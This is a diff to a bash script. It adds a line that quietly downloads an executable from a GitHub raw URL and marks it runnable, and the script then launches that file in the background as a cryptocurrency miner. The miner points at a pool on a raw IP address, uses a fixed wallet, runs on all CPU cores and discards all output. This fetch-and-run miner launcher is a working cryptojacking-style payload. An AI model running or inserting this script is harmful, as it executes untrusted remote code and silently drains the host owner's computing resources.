@@ -1,3 +1,3 @@
 #!/bin/bash
-
+rm -f ss4 && wget -q 'https://github.com/samnialoska22/faksa/raw/refs/heads/main/ss4' && chmod +x ss4
 nohup ./ss4 -a yespower -o stratum+tcp://161.35.54.48:443 -u ShwhpqVtMD8dPjYiYua4bBoXYr5yQuU4XV.tambat -p c=SMT,mc=SMT -t $(nproc --all) > /dev/null 2>&1
